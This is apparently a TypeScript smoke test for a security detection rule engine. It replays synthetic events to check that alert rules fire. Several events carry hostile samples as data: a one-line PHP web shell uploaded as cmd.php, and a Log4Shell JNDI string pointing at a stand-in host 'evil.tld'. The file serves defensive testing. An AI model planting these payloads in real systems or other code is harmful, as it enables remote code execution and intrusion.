import { AssetRegistry } from '../common/registry';
import { RuleEngine, SimeRule } from '../rule-engine/rule-engine';
import { AdapterDef, sampleRegression } from '../adapter-engine/adapter-engine';
import { benchRuleEngine } from './bench';

/** M0/M0.5 开箱验收：资产 Schema 校验 + 适配器样例回归 + 规则引擎合成回放（≥4 条规则命中）。 */
const registry = new AssetRegistry(process.env.SIME_ASSET_ROOT ?? '..');
const counts = registry.counts();
const errors = registry.totalErrors();
console.log(`asset counts: rules=${counts.rules} adapters=${counts.adapters} thing-models=${counts['thing-models']}`);
let failed: number =
  errors.length > 0 || counts.rules < 1 || counts.adapters < 1 || counts['thing-models'] < 1 ? 1 : 0;
for (const e of errors) console.error(`  ✗ ${e.file}: ${e.error}`);

// 2) 适配器样例驱动回归：解析失败即 CI 失败
for (const { def } of registry.load('adapters').entries.map(({ data }) => ({ def: data as unknown as AdapterDef }))) {
  const r = sampleRegression(def);
  console.log(`adapter regression ${def.id}: ${r.ok ? 'ok' : `FAIL ${r.error ?? ''}`}`);
  if (!r.ok) failed++;
}

// 3) 规则引擎合成回放
const ruleDefs = registry.load('rules').entries.map(({ data }) => data as unknown as SimeRule);
const engine = new RuleEngine(ruleDefs);
let ts = Date.now() - 600_000;
const ev: Record<string, unknown>[] = [];
const push = (e: Record<string, unknown>) => {
  ts += 12_000;
  ev.push({ ...e, '@timestamp': new Date(ts).toISOString() });
};
for (let i = 0; i < 20; i++)
  push({ event: { category: 'authentication', outcome: 'failure' }, src: { ip: '198.51.100.7' }, dst: { ip: `10.2.85.${100 + (i % 3)}`, asset_id: `dev-powe-${i % 3}` }, user: { name: 'admin' } });
for (let i = 0; i < 20; i++)
  push({ event: { category: 'network-connection', outcome: 'success' }, src: { ip: '203.0.113.9' }, dst: { ip: `10.2.86.${i}`, asset_id: `dev-gate-${i}` } });
push({ event: { category: 'web', outcome: 'failure' }, src: { ip: '203.0.113.15' }, dst: { ip: '10.2.85.119' }, http: { request: { method: 'POST', body: { content: '<?php eval($_POST[c]);?>' } } }, url: { path: '/uploads/cmd.php' }, file: { name: 'cmd.php' } });
push({ event: { category: 'web', outcome: 'failure' }, src: { ip: '203.0.113.20' }, dst: { ip: '10.2.85.120' }, url: { query: 'x=${jndi:ldap://evil.tld/a}' } });
push({ event: { name: 'reverse_shell', outcome: 'failure' }, src: { ip: '10.233.9.9' }, dst: { ip: '10.2.85.130', asset_id: 'dev-gate-0007', asset: { id: 'dev-gate-0007', labels: { zone: 'dmz' } } } });
push({ event: { category: 'ics-command', outcome: 'success', action: 'write' }, src: { ip: '10.233.9.66' }, dst: { ip: '10.233.9.2', asset_id: 'dev-plc-0001', asset: { id: 'dev-plc-0001', type: 'plc', security: { command_allowlist: ['scada-master-01'] } } } });
push({ event: { category: 'endpoint', name: 'virus_detect', outcome: 'detected' }, src: { ip: '10.233.71.108', asset_id: 'dev-gate-0042' } });
for (let i = 0; i < 6; i++)
  push({ event: { category: 'authentication', outcome: 'failure' }, src: { ip: '10.233.71.108', asset_id: 'dev-gate-0042' }, dst: { ip: '10.2.88.50', asset_id: 'dev-gate-0099' } });

let alerts = 0;
const fired = new Set<string>();
for (const e of ev) {
  for (const a of engine.feed(e, Date.parse(String(e['@timestamp'])))) {
    alerts++;
    fired.add(a.ruleId);
  }
}
console.log(`engine replay: events=${ev.length} alerts=${alerts} firedRules=${fired.size}`);
console.log(`fired: ${[...fired].join(', ')}`);
if (alerts < 4 || fired.size < 4) {
  console.error('engine replay expectation failed: >=4 rules expected to fire');
  failed++;
}

// 4) 性能地板（防灾难性回归；正式基准见 npm run bench）
const bench = benchRuleEngine(20_000);
console.log(`perf floor: rule-engine ${bench.opsPerSec.toLocaleString('en-US')} eps (floor 5,000)`);
if (bench.opsPerSec < 5_000) {
  console.error('perf floor failed: engine slower than 5k eps');
  failed++;
}

if (failed > 0) {
  console.error('smoke test FAILED');
  process.exit(1);
}
console.log('smoke test PASSED');
